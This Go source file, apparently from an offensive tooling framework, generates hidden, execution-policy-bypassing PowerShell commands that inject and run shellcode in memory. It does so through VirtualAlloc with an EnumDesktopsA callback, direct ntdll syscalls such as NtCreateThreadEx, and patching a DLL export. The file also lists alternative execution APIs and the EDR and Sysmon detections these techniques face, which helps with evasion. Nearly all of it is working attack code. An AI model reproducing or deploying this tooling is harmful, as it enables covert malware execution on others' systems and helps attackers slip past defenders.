package processinjection

import "fmt"

func InjectLocal(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return `-NoP -NonI -W Hidden -Exec Bypass -C `+
		`"$buf=[byte[]]@(0x%%s); `+
		`$va=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualAlloc'),`+
		`[Func[int,int,int,int,int]]); `+
		`$p=$va.Invoke(0,$buf.Length,0x3000,0x40); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$p,$buf.Length); `+
		`$ed=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'EnumDesktopsA'),`+
		`[Func[IntPtr,IntPtr,IntPtr,int]]); `+
		`$ed.Invoke(0,$p,0)"`, nil
}

func InjectLocalSyscall(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return `-NoP -NonI -W Hidden -Exec Bypass -C `+
		`"$buf=[byte[]]@(0x%%s); `+
		`$ntdll=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
		`$NtAllocate=[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtAllocateVirtualMemory'); `+
		`$del=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtAllocate,[Func[IntPtr,IntPtr,IntPtr,IntPtr,int,int,int]]); `+
		`$h=[PoshWin32.Kernel32]::GetCurrentProcess(); $base=0; $size=0x1000; `+
		`$del.Invoke($h,[ref]$base,0,[ref]$size,0x3000,0x40); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$base,$buf.Length); `+
		`$NtProtect=[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtProtectVirtualMemory'); `+
		`$protDel=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtProtect,[Func[IntPtr,IntPtr,IntPtr,int,int]]); `+
		`$old=0; $protDel.Invoke($h,[ref]$base,[ref]$size,0x20,[ref]$old); `+
		`$NtCreateTh=[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateThreadEx'); `+
		`$thDel=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateTh,[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,int,int,int,IntPtr]]); `+
		`$thDel.Invoke(0,0,0,$h,$base,0,0,0,0,0)"`, nil
}

func InjectLocalCarbonCopy(dllPath string, exportPayload []byte) (string, error) {
	if dllPath == "" {
		return "", fmt.Errorf("empty DLL path")
	}
	if len(exportPayload) == 0 {
		return "", fmt.Errorf("empty export payload")
	}
	_ = exportPayload
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$orig=[System.IO.File]::ReadAllBytes('%s'); `+
			`$exportRva=0x%%EXPORT_RVA%%; `+
			`$orig[$exportRva..($exportRva+$payload.Length-1)]=$payload; `+
			`$m=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualAlloc'),`+
			`[Func[int,int,int,int,int]]); `+
			`$p=$m.Invoke(0,$orig.Length,0x3000,0x40); `+
			`[System.Runtime.InteropServices.Marshal]::Copy($orig,0,$p,$orig.Length); `+
			`$pth=[PoshWin32.Kernel32]::GetProcAddress($p,'%s'); `+
			`$cd=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pth,[Func[int]]); $cd.Invoke()"`,
		dllPath, "DllRegisterServer",
	), nil
}

func LocalInjectionAPIMap() map[int]string {
	return map[int]string{
		1: "VirtualAlloc(NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) -> lpMemory",
		2: "RtlCopyMemory/CopyMemory(lpMemory, shellcode, dwSize) -> copy shellcode",
		3: "VirtualProtect(lpMemory, dwSize, PAGE_EXECUTE_READ, &oldProtect) -> make executable",
		4: "EnumDesktopsA(NULL, lpMemory, NULL) -> callback executes shellcode",
		5: "Alternative: SetTimer(NULL, 0, 0, lpMemory) -> timer callback executes shellcode",
		6: "Alternative: CreateThread(NULL, 0, lpMemory, NULL, 0, &threadId) -> thread executes shellcode",
		7: "Alternative: EnumSystemLocalesA(lpMemory, 0) -> locale callback executes shellcode",
	}
}

func LocalInjectionDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":     "CreateRemoteThread NOT relevant - local thread",
		"Sysmon EventID 10":    "ProcessAccess NOT relevant - no cross-process access",
		"Sysmon EventID 7":    "ImageLoaded - callback functions (EnumDesktopsA, SetTimer) loaded and used in unusual ways",
		"AMSI EventID 1105":    "AMSI scans PowerShell loading shellcode into memory",
		"ETW Microsoft-Windows-Kernel-Process": "Thread creation events for CreateThread variant",
		"CrowdStrike Falcon":   "CS detects via unusual callback execution from non-standard memory regions",
		"SentinelOne":          "S1 monitors for VirtualAlloc(MEM_COMMIT|PAGE_READWRITE) + VirtualProtect(PAGE_EXECUTE) sequence in same process",
		"Microsoft Defender":   "MDE detects via suspicious callback pointer pointing to dynamically allocated memory",
	}
}
